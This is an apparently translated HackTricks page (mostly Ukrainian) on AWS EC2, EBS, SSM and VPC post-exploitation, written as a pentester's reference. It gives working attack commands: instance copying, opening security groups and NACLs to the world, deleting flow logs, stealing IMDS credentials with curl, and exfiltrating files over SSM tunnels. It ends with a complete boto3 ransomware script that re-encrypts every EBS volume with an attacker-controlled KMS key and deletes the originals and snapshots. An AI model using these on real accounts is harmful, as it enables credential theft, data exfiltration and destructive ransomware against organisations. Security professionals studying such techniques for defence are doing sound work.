# AWS - EC2, EBS, SSM & VPC Post Exploitation

{{#include ../../../../banners/hacktricks-training.md}}

## EC2 & VPC

Для отримання додаткової інформації див.:

{{#ref}}
../../aws-services/aws-ec2-ebs-elb-ssm-vpc-and-vpn-enum/
{{#endref}}

### **Зловмисний VPC Mirror -** `ec2:DescribeInstances`, `ec2:RunInstances`, `ec2:CreateSecurityGroup`, `ec2:AuthorizeSecurityGroupIngress`, `ec2:CreateTrafficMirrorTarget`, `ec2:CreateTrafficMirrorSession`, `ec2:CreateTrafficMirrorFilter`, `ec2:CreateTrafficMirrorFilterRule`

VPC traffic mirroring **дублює вхідний та вихідний трафік для EC2 інстансів всередині VPC** без необхідності встановлювати будь-що на самі інстанси. Цей дубльований трафік зазвичай надсилається до чогось на кшталт системи виявлення мережевих вторгнень (IDS) для аналізу та моніторингу.\
Зловмисник може зловживати цим, щоб перехопити весь трафік і отримати конфіденційну інформацію з нього:

Для отримання додаткової інформації див. цю сторінку:

{{#ref}}
aws-malicious-vpc-mirror.md
{{#endref}}

### Copy Running Instance

Інстанси зазвичай містять певну конфіденційну інформацію. Існують різні способи потрапити всередину (check [EC2 privilege escalation tricks](../../aws-privilege-escalation/aws-ec2-privesc/README.md)). Однак інший спосіб перевірити, що він містить, — **створити AMI і запустити з нього новий інстанс (навіть у власному обліковому записі)**:
```shell
# List instances
aws ec2 describe-images

# create a new image for the instance-id
aws ec2 create-image --instance-id i-0438b003d81cd7ec5 --name "AWS Audit" --description "Export AMI" --region eu-west-1

# add key to AWS
aws ec2 import-key-pair --key-name "AWS Audit" --public-key-material file://~/.ssh/id_rsa.pub --region eu-west-1

# create ec2 using the previously created AMI, use the same security group and subnet to connect easily.
aws ec2 run-instances --image-id ami-0b77e2d906b00202d --security-group-ids "sg-6d0d7f01" --subnet-id subnet-9eb001ea --count 1 --instance-type t2.micro --key-name "AWS Audit" --query "Instances[0].InstanceId" --region eu-west-1

# now you can check the instance
aws ec2 describe-instances --instance-ids i-0546910a0c18725a1

# If needed : edit groups
aws ec2 modify-instance-attribute --instance-id "i-0546910a0c18725a1" --groups "sg-6d0d7f01"  --region eu-west-1

# be a good guy, clean our instance to avoid any useless cost
aws ec2 stop-instances --instance-id "i-0546910a0c18725a1" --region eu-west-1
aws ec2 terminate-instances --instance-id "i-0546910a0c18725a1" --region eu-west-1
```
### EBS Snapshot dump

**Snapshots are backups of volumes**, які зазвичай містять **чутливу інформацію**, тому їх перевірка має розкрити ці дані.\
Якщо ви знайдете **volume without a snapshot** ви можете: **Create a snapshot** і виконати наведені нижче дії або просто **mount it in an instance** всередині акаунту:

{{#ref}}
aws-ebs-snapshot-dump.md
{{#endref}}

### Covert Disk Exfiltration via AMI Store-to-S3

Експортуйте EC2 AMI безпосередньо в S3 за допомогою `CreateStoreImageTask`, щоб отримати сирий образ диска без snapshot sharing. Це дозволяє виконати повну офлайн-форензіку або крадіжку даних, не змінюючи мережеві налаштування instance.

{{#ref}}
aws-ami-store-s3-exfiltration.md
{{#endref}}

### Live Data Theft via EBS Multi-Attach

Підключіть io1/io2 Multi-Attach volume до другої instance і змонтуйте його в режимі read-only, щоб витягти live data без створення snapshot-ів. Корисно, коли victim volume вже має увімкнений Multi-Attach у тій самій AZ.

{{#ref}}
aws-ebs-multi-attach-data-theft.md
{{#endref}}

### EC2 Instance Connect Endpoint Backdoor

Створіть EC2 Instance Connect Endpoint, авторизуйте ingress та інжектуйте ephemeral SSH keys, щоб отримати доступ до приватних instances через керований тунель. Надає швидкі lateral movement шляхи без відкриття публічних портів.

{{#ref}}
aws-ec2-instance-connect-endpoint-backdoor.md
{{#endref}}

### EC2 ENI Secondary Private IP Hijack

Move a victim ENI’s secondary private IP to an attacker-controlled ENI to impersonate trusted hosts that are allowlisted by IP. Enables bypassing internal ACLs or SG rules keyed to specific addresses.

{{#ref}}
aws-eni-secondary-ip-hijack.md
{{#endref}}

### Elastic IP Hijack for Ingress/Egress Impersonation

Переасоціюйте Elastic IP з інстансу жертви на інстанс нападника, щоб перехоплювати вхідний трафік або ініціювати вихідні з'єднання, які виглядають як такі, що походять з довірених публічних IP-адрес.

{{#ref}}
aws-eip-hijack-impersonation.md
{{#endref}}

### Security Group Backdoor via Managed Prefix Lists

Якщо правило security group посилається на customer-managed prefix list, додавання attacker CIDRs до цього списку непомітно розширює доступ для всіх залежних правил SG без зміни самої SG.

{{#ref}}
aws-managed-prefix-list-backdoor.md
{{#endref}}

### VPC Endpoint Egress Bypass

Створіть gateway або interface VPC endpoints, щоб відновити вихідний доступ з ізольованих підмереж. Використання AWS-managed private links дозволяє обходити відсутні IGW/NAT контролі для ексфільтрації даних.

{{#ref}}
aws-vpc-endpoint-egress-bypass.md
{{#endref}}

### `ec2:AuthorizeSecurityGroupIngress`

Нападник з дозволом ec2:AuthorizeSecurityGroupIngress може додавати inbound правила до security groups (наприклад, дозволити tcp:80 з 0.0.0.0/0), тим самим відкриваючи внутрішні сервіси для публічного Інтернету або для неавторизованих мереж.
```bash
aws ec2 authorize-security-group-ingress --group-id <sg-id> --protocol tcp --port 80 --cidr 0.0.0.0/0
```
# `ec2:ReplaceNetworkAclEntry`
Зловмисник із правами ec2:ReplaceNetworkAclEntry (або подібними) може змінити Network ACLs (NACLs) підмережі, зробивши їх дуже дозволяючими — наприклад, дозволити 0.0.0.0/0 на критичних портах — відкривши весь діапазон підмережі в Інтернет або для неавторизованих мережевих сегментів. На відміну від Security Groups, які застосовуються на рівні інстансу, NACLs застосовуються на рівні підмережі, тому зміна обмежувальної NACL може мати значно більший радіус ураження, дозволяючи доступ до набагато більшої кількості хостів.
```bash
aws ec2 replace-network-acl-entry \
--network-acl-id <ACL_ID> \
--rule-number 100 \
--protocol <PROTOCOL> \
--rule-action allow \
--egress <true|false> \
--cidr-block 0.0.0.0/0
```
### `ec2:Delete*`

Зловмисник з правами ec2:Delete* та iam:Remove* може видалити критичні ресурси інфраструктури та конфігурації — наприклад key pairs, launch templates/versions, AMIs/snapshots, volumes or attachments, security groups or rules, ENIs/network endpoints, route tables, gateways, or managed endpoints. Це може спричинити негайний збій сервісу, втрату даних та знищення судово-технічних доказів.

Один приклад — видалення security group:

aws ec2 delete-security-group \
--group-id <SECURITY_GROUP_ID>

### VPC Flow Logs Cross-Account Exfiltration

Налаштуйте VPC Flow Logs на S3 bucket, контрольований зловмисником, щоб постійно збирати мережеві метадані (source/destination, ports) поза межами облікового запису жертви для тривалого розвідування.

{{#ref}}
aws-vpc-flow-logs-cross-account-exfiltration.md
{{#endref}}

### Data Exfiltration

#### DNS Exfiltration

Навіть якщо ви закрили EC2 так, що жоден трафік не може вийти, він все одно може **exfil via DNS**.

- **VPC Flow Logs will not record this**.
- У вас немає доступу до AWS DNS logs.
- Вимкніть це, встановивши "enableDnsSupport" у false за допомогою:

`aws ec2 modify-vpc-attribute --no-enable-dns-support --vpc-id <vpc-id>`

#### Exfiltration via API calls

Зловмисник може викликати API endpoints облікового запису, яким він керує. Cloudtrail зареєструє ці виклики, і зловмисник зможе побачити exfiltrate data у Cloudtrail логах.

### Open Security Group

Ви можете отримати додатковий доступ до мережевих сервісів, відкривши порти таким чином:
```bash
aws ec2 authorize-security-group-ingress --group-id <sg-id> --protocol tcp --port 80 --cidr 0.0.0.0/0
# Or you could just open it to more specific ips or maybe th einternal network if you have already compromised an EC2 in the VPC
```
### Privesc to ECS

It's possible to run an EC2 instance an register it to be used to run ECS instances and then steal the ECS instances data.

For [**more information check this**](../../aws-privilege-escalation/aws-ec2-privesc/README.md#privesc-to-ecs).

### ECS-on-EC2 IMDS Abuse & ECS Agent Impersonation

Компрометація всередині будь-якого ECS task, що працює на EC2 container instance, зазвичай достатня, щоб переключитися на роль хоста і отримати доступ до IAM ролей, пов’язаних зі всіма іншими task’ами на цьому вузлі. Оскільки для ECS-on-EC2 існує **немає ізоляції task’ів**, кожен task за замовчуванням може звертатись до EC2 Instance Metadata Service (IMDS), викрасти container instance profile і потім говорити тим самим WebSocket протоколом, який використовує ECS agent, до control plane (the **ECScape** primitive), щоб запросити облікові дані для кожного task, який наразі запланований на цьому хості. Latacora документували цю роботу в своєму [ECS-on-EC2 IMDS research](https://www.latacora.com/blog/2025/10/02/ecs-on-ec2-covering-gaps-in-imds-hardening/), яку наступне offensive summary стискає.

#### Attack chain

1. **Steal the instance profile from inside the container.** Assume IMDSv2 is required, so request a token and then fetch the profile.

```bash
TOKEN=$(curl -s -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
curl -s -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/{InstanceProfileName}
```
2. **Use the container instance role to impersonate the ECS agent.** With those credentials you can speak the undocumented WebSocket channel the ECS agent uses; the control plane trusts you as the real agent and delivers **all task IAM credentials** to your process. You can now run higher-privileged tasks locally, dump task environment secrets, or update services/tasks to redeploy workloads you can fully inspect.

#### IMDS reachability with IMDSv2 + hop limit 1

Налаштування IMDSv2 з `HttpTokens=required` та `HttpPutResponseHopLimit=1` блокує лише ті task’и, що знаходяться за додатковим hop’ом (Docker bridge). Інші мережеві режими залишаються в одному hop’і від Nitro controller і все ще отримують відповіді:

| ECS network mode | IMDS reachable? | Reason |
| --- | --- | --- |
| `awsvpc` | ✅ | Each task gets its own ENI that is still one hop away from IMDS, so tokens and metadata responses arrive successfully. |
| `host` | ✅ | Tasks share the host namespace, so they see the same hop distance as the EC2 instance. |
| `bridge` | ❌ | Responses die on the Docker bridge because that extra hop exhausts the hop limit. |

Отже, **ніколи не припускайте, що hop limit 1 захищає awsvpc або host-mode workload’и** — завжди тестуйте зсередини ваших контейнерів.

#### Detecting IMDS blocks per network mode

- **awsvpc tasks:** Security groups, NACLs або зміни маршрутизації не можуть заблокувати link-local адресу 169.254.169.254, тому що Nitro інжектить її на хості. Перевірте `/etc/ecs/ecs.config` на наявність `ECS_AWSVPC_BLOCK_IMDS=true`. Якщо прапорець відсутній (за замовчуванням), ви можете curl IMDS безпосередньо з task. Якщо він встановлений, перейдіть у host/agent namespace, щоб відключити його, або запустіть ваші інструменти поза awsvpc.

- **bridge mode:** Коли запити метаданих падають, навіть якщо hop limit 1 налаштований, захисники, ймовірно, вставили `DOCKER-USER` drop правило типу `--in-interface docker+ --destination 169.254.169.254/32 --jump DROP`. Перелік `iptables -S DOCKER-USER` це виявляє, і доступ до root дозволяє вам видалити або змінити порядок правила перед запитом до IMDS.

- **host mode:** Перевірте конфігурацію агента на `ECS_ENABLE_TASK_IAM_ROLE_NETWORK_HOST=false`. Це налаштування повністю видаляє task IAM ролі, тож вам доведеться або знову ввімкнути його, перейти на awsvpc tasks, або вкрасти облікові дані через інший процес на хості. Коли значення `true` (за замовчуванням), кожен процес у host-mode — включно зі скомпрометованими контейнерами — може дістатися IMDS, якщо тільки спеціальні eBPF/cgroup фільтри не таргетують `169.254.169.254`; шукайте програми tc/eBPF або iptables правила, що посилаються на цю адресу.

Latacora навіть опублікували [Terraform validation code](https://github.com/latacora/ecs-on-ec2-gaps-in-imds-hardening), який можна запустити в цільовому акаунті, щоб перерахувати, які мережеві режими ще відкривають metadata, і спланувати ваш наступний хід відповідно.

Як тільки ви з’ясуєте, які режими відкривають IMDS, ви можете спланувати шлях post-exploitation: таргетити будь-який ECS task, запросити instance profile, підробити агента і зібрати ролі всіх інших task’ів для латерального руху або персистенції в кластері.

### Remove VPC flow logs
```bash
aws ec2 delete-flow-logs --flow-log-ids <flow_log_ids> --region <region>
```
### SSM Port Forwarding

Required permissions:

- `ssm:StartSession`

Окрім виконання команд, SSM дозволяє traffic tunneling, який можна зловживати для pivot з EC2 instances, що не мають мережевого доступу через Security Groups або NACLs.
Один із сценаріїв, де це корисно — pivoting з [Bastion Host](https://www.geeksforgeeks.org/what-is-aws-bastion-host/) до приватного EKS cluster.

> Щоб розпочати сесію, потрібен встановлений SessionManagerPlugin: https://docs.aws.amazon.com/systems-manager/latest/userguide/install-plugin-macos-overview.html

1. Встановіть SessionManagerPlugin на вашій машині
2. Увійдіть в Bastion EC2 за допомогою наступної команди:
```shell
aws ssm start-session --target "$INSTANCE_ID"
```
3. Отримайте тимчасові облікові дані Bastion EC2 AWS за допомогою скрипта [Abusing SSRF in AWS EC2 environment](https://book.hacktricks.wiki/en/pentesting-web/ssrf-server-side-request-forgery/cloud-ssrf.html#abusing-ssrf-in-aws-ec2-environment)
4. Перенесіть облікові дані на вашу машину у файл `$HOME/.aws/credentials` як профіль `[bastion-ec2]`
5. Увійдіть до EKS як Bastion EC2:
```shell
aws eks update-kubeconfig --profile bastion-ec2 --region <EKS-CLUSTER-REGION> --name <EKS-CLUSTER-NAME>
```
6. Оновіть поле `server` у файлі `$HOME/.kube/config`, щоб вказувати на `https://localhost`
7. Створіть SSM-тунель таким чином:
```shell
sudo aws ssm start-session --target $INSTANCE_ID --document-name AWS-StartPortForwardingSessionToRemoteHost --parameters '{"host":["<TARGET-IP-OR-DOMAIN>"],"portNumber":["443"], "localPortNumber":["443"]}' --region <BASTION-INSTANCE-REGION>
```
8. Трафік інструмента `kubectl` тепер перенаправляється через SSM tunnel через Bastion EC2, і ви можете отримати доступ до приватного кластера EKS зі своєї машини, виконавши:
```shell
kubectl get pods --insecure-skip-tls-verify
```
Зауважте, що SSL-з'єднання не вдасться встановити, якщо ви не задасте прапорець `--insecure-skip-tls-verify ` (або його еквівалент у K8s audit tools). Оскільки трафік тунелюється через захищений AWS SSM tunnel, ви захищені від будь-яких MitM-атак.

Нарешті, ця техніка не є специфічною для атак на приватні EKS кластери. Ви можете вказувати довільні домени й порти для pivot до будь-якого іншого AWS сервісу або власного додатку.

---

#### Швидкий Local ↔️ Remote Port Forward (AWS-StartPortForwardingSession)

Якщо вам потрібно перенаправити лише один TCP-порт з EC2 instance на ваш локальний хост, ви можете використовувати документ SSM `AWS-StartPortForwardingSession` (параметр remote host не потрібен):
```bash
aws ssm start-session --target i-0123456789abcdef0 \
--document-name AWS-StartPortForwardingSession \
--parameters "portNumber"="8000","localPortNumber"="8000" \
--region <REGION>
```
Команда встановлює двонапрямлений тунель між вашою робочою станцією (`localPortNumber`) та обраним портом (`portNumber`) на інстансі **без відкриття будь-яких вхідних правил Security-Group**.

Типові сценарії використання:

* **File exfiltration**
1. На інстансі запустіть простий HTTP server, що вказує на директорію, яку ви хочете exfiltrate:

```bash
python3 -m http.server 8000
```

2. З вашої робочої станції завантажте файли через SSM tunnel:

```bash
curl http://localhost:8000/loot.txt -o loot.txt
```

* **Доступ до внутрішніх веб-застосунків (наприклад, Nessus)**
```bash
# Forward remote Nessus port 8834 to local 8835
aws ssm start-session --target i-0123456789abcdef0 \
--document-name AWS-StartPortForwardingSession \
--parameters "portNumber"="8834","localPortNumber"="8835"
# Browse to http://localhost:8835
```
Порада: стисніть і зашифруйте докази перед їх ексфільтрацією, щоб CloudTrail не реєстрував зміст у відкритому вигляді:
```bash
# On the instance
7z a evidence.7z /path/to/files/* -p'Str0ngPass!'
```
### Поділитися AMI
```bash
aws ec2 modify-image-attribute --image-id <image_ID> --launch-permission "Add=[{UserId=<recipient_account_ID>}]" --region <AWS_region>
```
### Пошук чутливої інформації в публічних та приватних Amazon Machine Images (AMIs)

- [https://github.com/saw-your-packet/CloudShovel](https://github.com/saw-your-packet/CloudShovel): CloudShovel — інструмент, призначений для **пошуку чутливої інформації в публічних або приватних Amazon Machine Images (AMIs)**. Він автоматизує процес запуску інстансів з цільових AMI, монтування їхніх томів та сканування на наявність потенційних секретів або чутливих даних.

### Спільний доступ до EBS Snapshot
```bash
aws ec2 modify-snapshot-attribute --snapshot-id <snapshot_ID> --create-volume-permission "Add=[{UserId=<recipient_account_ID>}]" --region <AWS_region>
```
### EBS Ransomware PoC

Доказ концепції, схожий на демонстрацію Ransomware, наведений у примітках про post-exploitation для S3. KMS слід перейменувати на RMS (Ransomware Management Service) через те, наскільки легко ним користуватися для шифрування різних сервісів AWS.

Спочатку з 'attacker' AWS акаунта створіть customer managed key у KMS. У цьому прикладі ми просто дозволимо AWS керувати даними ключа за мене, але в реалістичному сценарії зловмисник зберіг би дані ключа поза контролем AWS. Змініть політику ключа, щоб дозволити будь-якому AWS account Principal використовувати цей ключ. У цій політиці ключа ім'я акаунта було 'AttackSim', а правило політики, що дозволяє повний доступ, називається 'Outside Encryption'
```
{
"Version": "2012-10-17",
"Id": "key-consolepolicy-3",
"Statement": [
{
"Sid": "Enable IAM User Permissions",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:root"
},
"Action": "kms:*",
"Resource": "*"
},
{
"Sid": "Allow access for Key Administrators",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:user/AttackSim"
},
"Action": [
"kms:Create*",
"kms:Describe*",
"kms:Enable*",
"kms:List*",
"kms:Put*",
"kms:Update*",
"kms:Revoke*",
"kms:Disable*",
"kms:Get*",
"kms:Delete*",
"kms:TagResource",
"kms:UntagResource",
"kms:ScheduleKeyDeletion",
"kms:CancelKeyDeletion"
],
"Resource": "*"
},
{
"Sid": "Allow use of the key",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:user/AttackSim"
},
"Action": [
"kms:Encrypt",
"kms:Decrypt",
"kms:ReEncrypt*",
"kms:GenerateDataKey*",
"kms:DescribeKey"
],
"Resource": "*"
},
{
"Sid": "Outside Encryption",
"Effect": "Allow",
"Principal": {
"AWS": "*"
},
"Action": [
"kms:Encrypt",
"kms:Decrypt",
"kms:ReEncrypt*",
"kms:GenerateDataKey*",
"kms:DescribeKey",
"kms:GenerateDataKeyWithoutPlainText",
"kms:CreateGrant"
],
"Resource": "*"
},
{
"Sid": "Allow attachment of persistent resources",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:user/AttackSim"
},
"Action": [
"kms:CreateGrant",
"kms:ListGrants",
"kms:RevokeGrant"
],
"Resource": "*",
"Condition": {
"Bool": {
"kms:GrantIsForAWSResource": "true"
}
}
}
]
}
```
Правило key policy має містити ввімкнені наступні дозволи, щоб мати можливість використовувати його для шифрування EBS тома:

- `kms:CreateGrant`
- `kms:Decrypt`
- `kms:DescribeKey`
- `kms:GenerateDataKeyWithoutPlainText`
- `kms:ReEncrypt`

Тепер, коли публічно доступний key готовий до використання. Ми можемо використати обліковий запис 'victim', у якому запущено декілька EC2 інстансів з приєднаними нешифрованими EBS томами. Саме EBS томи цього 'victim' акаунта є нашою ціллю для шифрування — ця атака здійснюється за умови компрометації облікового запису з високими привілеями в AWS.

![Pasted image 20231231172655](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/5b9a96cd-6006-4965-84a4-b090456f90c6) ![Pasted image 20231231172734](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/4294289c-0dbd-4eb6-a484-60b4e4266459)

Аналогічно прикладу S3 ransomware. Ця атака створить копії приєднаних EBS томів за допомогою snapshots, використає публічно доступний key з облікового запису 'attacker' для шифрування нових EBS томів, потім відмонтує оригінальні EBS томи з EC2 інстансів і видалить їх, а наприкінці видалить snapshots, які були використані для створення нових зашифрованих EBS томів. ![Pasted image 20231231173130](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/34808990-2b3b-4975-a523-8ee45874279e)

В результаті в акаунті залишаться лише зашифровані EBS томи.

![Pasted image 20231231173338](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/eccdda58-f4b1-44ea-9719-43afef9a8220)

Також варто зазначити, що скрипт зупинив EC2 інстанси, щоб відчепити і видалити оригінальні EBS томи. Оригінальні нешифровані томи тепер зникли.

![Pasted image 20231231173931](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/cc31a5c9-fbb4-4804-ac87-911191bb230e)

Далі поверніться до key policy в обліковому записі 'attacker' і видаліть правило політики 'Outside Encryption' з key policy.
```json
{
"Version": "2012-10-17",
"Id": "key-consolepolicy-3",
"Statement": [
{
"Sid": "Enable IAM User Permissions",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:root"
},
"Action": "kms:*",
"Resource": "*"
},
{
"Sid": "Allow access for Key Administrators",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:user/AttackSim"
},
"Action": [
"kms:Create*",
"kms:Describe*",
"kms:Enable*",
"kms:List*",
"kms:Put*",
"kms:Update*",
"kms:Revoke*",
"kms:Disable*",
"kms:Get*",
"kms:Delete*",
"kms:TagResource",
"kms:UntagResource",
"kms:ScheduleKeyDeletion",
"kms:CancelKeyDeletion"
],
"Resource": "*"
},
{
"Sid": "Allow use of the key",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:user/AttackSim"
},
"Action": [
"kms:Encrypt",
"kms:Decrypt",
"kms:ReEncrypt*",
"kms:GenerateDataKey*",
"kms:DescribeKey"
],
"Resource": "*"
},
{
"Sid": "Allow attachment of persistent resources",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:user/AttackSim"
},
"Action": ["kms:CreateGrant", "kms:ListGrants", "kms:RevokeGrant"],
"Resource": "*",
"Condition": {
"Bool": {
"kms:GrantIsForAWSResource": "true"
}
}
}
]
}
```
Зачекайте трохи, щоб нова політика ключа поширилася. Потім поверніться до облікового запису 'victim' і спробуйте приєднати один із щойно зашифрованих томів EBS. Ви побачите, що можете приєднати том.

![Pasted image 20231231174131](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/ba9e5340-7020-4af9-95cc-0e02267ced47) ![Pasted image 20231231174258](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/6c3215ec-4161-44e2-b1c1-e32f43ad0fa4)

Але коли ви спробуєте фактично запустити EC2 інстанс з зашифрованим томом EBS, це просто не вдасться: інстанс перейде зі стану 'pending' назад у 'stopped' і залишатиметься в ньому, оскільки приєднаний том EBS не може бути розшифрований за допомогою ключа через відсутність дозволу в політиці ключа.

![Pasted image 20231231174322](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/73456c22-0828-4da9-a737-e4d90fa3f514) ![Pasted image 20231231174352](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/4d83a90e-6fa9-4003-b904-a4ba7f5944d0)

Це python скрипт, який використовувався. Він приймає AWS облікові дані для облікового запису 'victim' та загальнодоступний AWS ARN ключа, що використовуватиметься для шифрування. Скрипт створює зашифровані копії ВСІХ доступних томів EBS, приєднаних до ВСІХ EC2 інстансів у цільовому AWS обліковому записі, потім зупиняє кожний EC2 інстанс, від'єднує оригінальні томи EBS, видаляє їх і нарешті видаляє всі snapshots, використані під час процесу. Це залишає у цільовому обліковому записі 'victim' лише зашифровані томи EBS. ВИКОРИСТОВУЙТЕ ЦЕЙ СКРИПТ ЛИШЕ В ТЕСТОВОМУ СЕРЕДОВИЩІ — ВІН ДЕСТРУКТИВНИЙ І ВИДАЛИТЬ ВСІ ОРИГІНАЛЬНІ ТОМИ EBS. Ви можете відновити їх, використавши застосований KMS key і відновивши зі snapshots, але хочу попередити, що в кінці кінців це ransomware PoC.
```
import boto3
import argparse
from botocore.exceptions import ClientError

def enumerate_ec2_instances(ec2_client):
instances = ec2_client.describe_instances()
instance_volumes = {}
for reservation in instances['Reservations']:
for instance in reservation['Instances']:
instance_id = instance['InstanceId']
volumes = [vol['Ebs']['VolumeId'] for vol in instance['BlockDeviceMappings'] if 'Ebs' in vol]
instance_volumes[instance_id] = volumes
return instance_volumes

def snapshot_volumes(ec2_client, volumes):
snapshot_ids = []
for volume_id in volumes:
snapshot = ec2_client.create_snapshot(VolumeId=volume_id)
snapshot_ids.append(snapshot['SnapshotId'])
return snapshot_ids

def wait_for_snapshots(ec2_client, snapshot_ids):
for snapshot_id in snapshot_ids:
ec2_client.get_waiter('snapshot_completed').wait(SnapshotIds=[snapshot_id])

def create_encrypted_volumes(ec2_client, snapshot_ids, kms_key_arn):
new_volume_ids = []
for snapshot_id in snapshot_ids:
snapshot_info = ec2_client.describe_snapshots(SnapshotIds=[snapshot_id])['Snapshots'][0]
volume_id = snapshot_info['VolumeId']
volume_info = ec2_client.describe_volumes(VolumeIds=[volume_id])['Volumes'][0]
availability_zone = volume_info['AvailabilityZone']

volume = ec2_client.create_volume(SnapshotId=snapshot_id, AvailabilityZone=availability_zone,
Encrypted=True, KmsKeyId=kms_key_arn)
new_volume_ids.append(volume['VolumeId'])
return new_volume_ids

def stop_instances(ec2_client, instance_ids):
for instance_id in instance_ids:
try:
instance_description = ec2_client.describe_instances(InstanceIds=[instance_id])
instance_state = instance_description['Reservations'][0]['Instances'][0]['State']['Name']

if instance_state == 'running':
ec2_client.stop_instances(InstanceIds=[instance_id])
print(f"Stopping instance: {instance_id}")
ec2_client.get_waiter('instance_stopped').wait(InstanceIds=[instance_id])
print(f"Instance {instance_id} stopped.")
else:
print(f"Instance {instance_id} is not in a state that allows it to be stopped (current state: {instance_state}).")

except ClientError as e:
print(f"Error stopping instance {instance_id}: {e}")

def detach_and_delete_volumes(ec2_client, volumes):
for volume_id in volumes:
try:
ec2_client.detach_volume(VolumeId=volume_id)
ec2_client.get_waiter('volume_available').wait(VolumeIds=[volume_id])
ec2_client.delete_volume(VolumeId=volume_id)
print(f"Deleted volume: {volume_id}")
except ClientError as e:
print(f"Error detaching or deleting volume {volume_id}: {e}")


def delete_snapshots(ec2_client, snapshot_ids):
for snapshot_id in snapshot_ids:
try:
ec2_client.delete_snapshot(SnapshotId=snapshot_id)
print(f"Deleted snapshot: {snapshot_id}")
except ClientError as e:
print(f"Error deleting snapshot {snapshot_id}: {e}")

def replace_volumes(ec2_client, instance_volumes):
instance_ids = list(instance_volumes.keys())
stop_instances(ec2_client, instance_ids)

all_volumes = [vol for vols in instance_volumes.values() for vol in vols]
detach_and_delete_volumes(ec2_client, all_volumes)

def ebs_lock(access_key, secret_key, region, kms_key_arn):
ec2_client = boto3.client('ec2', aws_access_key_id=access_key, aws_secret_access_key=secret_key, region_name=region)

instance_volumes = enumerate_ec2_instances(ec2_client)
all_volumes = [vol for vols in instance_volumes.values() for vol in vols]
snapshot_ids = snapshot_volumes(ec2_client, all_volumes)
wait_for_snapshots(ec2_client, snapshot_ids)
create_encrypted_volumes(ec2_client, snapshot_ids, kms_key_arn)  # New encrypted volumes are created but not attached
replace_volumes(ec2_client, instance_volumes)  # Stops instances, detaches and deletes old volumes
delete_snapshots(ec2_client, snapshot_ids)  # Optionally delete snapshots if no longer needed

def parse_arguments():
parser = argparse.ArgumentParser(description='EBS Volume Encryption and Replacement Tool')
parser.add_argument('--access-key', required=True, help='AWS Access Key ID')
parser.add_argument('--secret-key', required=True, help='AWS Secret Access Key')
parser.add_argument('--region', required=True, help='AWS Region')
parser.add_argument('--kms-key-arn', required=True, help='KMS Key ARN for EBS volume encryption')
return parser.parse_args()

def main():
args = parse_arguments()
ec2_client = boto3.client('ec2', aws_access_key_id=args.access_key, aws_secret_access_key=args.secret_key, region_name=args.region)

instance_volumes = enumerate_ec2_instances(ec2_client)
all_volumes = [vol for vols in instance_volumes.values() for vol in vols]
snapshot_ids = snapshot_volumes(ec2_client, all_volumes)
wait_for_snapshots(ec2_client, snapshot_ids)
create_encrypted_volumes(ec2_client, snapshot_ids, args.kms_key_arn)
replace_volumes(ec2_client, instance_volumes)
delete_snapshots(ec2_client, snapshot_ids)

if __name__ == "__main__":
main()
```
## Посилання

- [Latacora - ECS on EC2: Усунення прогалин у захисті IMDS](https://www.latacora.com/blog/2025/10/02/ecs-on-ec2-covering-gaps-in-imds-hardening/)
- [Latacora ecs-on-ec2-gaps-in-imds-hardening Terraform repo](https://github.com/latacora/ecs-on-ec2-gaps-in-imds-hardening)
- [Pentest Partners – Як передавати файли в AWS за допомогою SSM](https://www.pentestpartners.com/security-blog/how-to-transfer-files-in-aws-using-ssm/)

{{#include ../../../../banners/hacktricks-training.md}}
